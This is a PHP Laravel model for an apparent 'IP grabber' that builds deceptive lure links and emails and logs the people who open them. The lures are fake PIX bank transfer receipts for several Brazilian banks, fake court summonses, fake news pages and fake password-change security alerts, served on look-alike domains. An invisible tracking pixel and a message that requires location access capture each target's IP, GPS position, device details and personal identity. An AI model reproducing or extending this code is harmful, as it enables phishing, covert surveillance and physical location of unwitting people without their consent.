<?php

namespace App\Models;

use App\Models\Concerns\Auditable;
use App\Models\IpGrabberFoto;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Relations\BelongsTo;
use Illuminate\Database\Eloquent\Relations\HasMany;
use Illuminate\Database\Eloquent\Relations\HasOne;
use Illuminate\Support\Facades\Storage;

class IpGrabber extends Model
{
    use Auditable;

    public const DEFAULT_CLICK_MESSAGE = 'Falha ao carregar';
    public const GPS_REQUIRED_MESSAGE = 'Você deve habilitar a localização para ver esse comprovante.';
    public const EMAIL_TYPE_MARKETING = 'marketing';
    public const EMAIL_TYPE_RECOVERY = 'recuperacao';

    protected $table = 'pixel_tracks';

    public static function bootAuditable(): void
    {
        static::created(function (IpGrabber $model): void {
            self::write('created', $model, null, self::sanitizeAuditValues($model->getAttributes()));
        });

        static::deleted(function (IpGrabber $model): void {
            self::write('deleted', $model, self::sanitizeAuditValues($model->getOriginal()), null);
        });
    }

    protected $fillable = [
        'token',
        'label',
        'target_email',
        'email_tipo',
        'recovery_email',
        'preview_tipo',
        'tracking_domain',
        'tracking_channel',
        'mensagem',
        'redirect_url',
        'noticia_url',
        'capture_gps',
        'capture_alvo',
        'capture_identity',
        'og_titulo',
        'og_descricao',
        'og_imagem',
        'og_imagem_upload',
        'intimacao_arquivo',
        'created_by',
        'ip',
        'ip_local',
        'porta',
        'gmt',
        'idioma',
        'plataforma',
        'resolucao',
        'cidade',
        'regiao',
        'pais',
        'latitude',
        'longitude',
        'gps_latitude',
        'gps_longitude',
        'gps_accuracy',
        'gps_status',
        'gps_error',
        'isp',
        'user_agent',
        'identidade_nome',
        'identidade_email',
        'identidade_telefone',
        'identidade_redes',
        'total_acessos',
        'clicked_at',
        'sent_at',
    ];

    protected $casts = [
        'latitude' => 'float',
        'longitude' => 'float',
        'gps_latitude' => 'float',
        'gps_longitude' => 'float',
        'gps_accuracy' => 'float',
        'capture_gps' => 'boolean',
        'capture_alvo' => 'boolean',
        'capture_identity' => 'boolean',
        'clicked_at' => 'datetime',
        'sent_at' => 'datetime',
        'total_acessos' => 'integer',
        'identidade_redes' => 'array',
    ];

    protected static function booted(): void
    {
        static::deleted(function (IpGrabber $ipGrabber): void {
            if ($ipGrabber->og_imagem_upload) {
                Storage::disk('public')->delete($ipGrabber->og_imagem_upload);
            }
            if ($ipGrabber->intimacao_arquivo) {
                Storage::disk('public')->delete($ipGrabber->intimacao_arquivo);
            }
        });
    }

    public function criador(): BelongsTo
    {
        return $this->belongsTo(User::class, 'created_by');
    }

    public function acessos(): HasMany
    {
        return $this->hasMany(IpGrabberAccess::class, 'pixel_track_id');
    }

    public function fotos(): HasMany
    {
        return $this->hasMany(IpGrabberFoto::class, 'pixel_track_id')->latest();
    }

    public function fotoMaisRecente(): HasOne
    {
        return $this->hasOne(IpGrabberFoto::class, 'pixel_track_id')->latestOfMany();
    }

    public function statusLabel(): string
    {
        return $this->clicked_at ? 'Capturado' : 'Aguardando';
    }

    public function trackingDomain(): ?string
    {
        if ($this->tracking_channel === 'email') {
            return 'agenciadanoticia.online';
        }

        return match ($this->preview_tipo) {
            'pix_bradesco' => 'comprovante.online',
            'pix_caixa' => 'comprovante.online',
            'pix_nome_alvo' => 'comprovante.online',
            'pix_bb' => 'comprovante.online',
            'pix_mercadopago' => 'comprovante.online',
            'pix_nubank' => 'comprovante.online',
            'intimacao' => 'intimacao.online',
            'noticia' => 'agenciadanoticia.online',
            default => filled($this->tracking_domain) ? (string) $this->tracking_domain : null,
        };
    }

    public function trackingPath(): string
    {
        return match ($this->preview_tipo) {
            'pix_bradesco', 'pix_caixa', 'pix_nome_alvo', 'pix_bb', 'pix_mercadopago', 'pix_nubank' => '/pix/' . $this->token,
            'noticia' => '/noticia/' . $this->token,
            'intimacao' => '/intimacao/' . $this->token,
            default => '/pixel/' . $this->token,
        };
    }

    public function trackingUrl(): string
    {
        $path = $this->trackingPath();
        $domain = $this->trackingDomain();

        if (! $domain) {
            return url($path);
        }

        return 'https://' . $domain . $path;
    }

    public function trackingAssetUrl(string $path): string
    {
        $domain = $this->trackingDomain();
        $normalizedPath = '/' . ltrim($path, '/');

        if (! $domain) {
            return url($normalizedPath);
        }

        return 'https://' . $domain . $normalizedPath;
    }

    public function trackingUrlWithQuery(array $query): string
    {
        return $this->appendQuery($this->trackingUrl(), $query);
    }

    public function emailClickUrl(): string
    {
        return $this->trackingUrlWithQuery([
            'origem' => 'email',
            'ref' => $this->token,
        ]);
    }

    public function emailSubject(): string
    {
        return match ($this->email_tipo) {
            self::EMAIL_TYPE_RECOVERY => 'Alerta de segurança: alteração de senha',
            default => 'Comprovante disponível',
        };
    }

    public function emailTrackingUrl(array $query = []): string
    {
        return $this->appendQuery($this->trackingAssetUrl(route('pixel.email-tracker', $this->token, false)), $query + [
            'open' => '1',
            'cb' => $this->token,
        ]);
    }

    public function emailTrackingTag(): string
    {
        $url = e($this->emailTrackingUrl());

        return "<img src=\"{$url}\" width=\"1\" height=\"1\" alt=\"\" style=\"width:1px;height:1px;border:0;outline:0;text-decoration:none;display:block;opacity:0;max-height:1px;overflow:hidden;\" />";
    }

    public function emailReadyHtml(): string
    {
        return view('mail.email-tracker-message', [
            'tracker' => $this,
        ])->render();
    }

    private function appendQuery(string $baseUrl, array $query): string
    {
        $queryString = http_build_query(array_filter($query, static fn (mixed $value): bool => $value !== null));

        if ($queryString === '') {
            return $baseUrl;
        }

        return $baseUrl . (str_contains($baseUrl, '?') ? '&' : '?') . $queryString;
    }
}
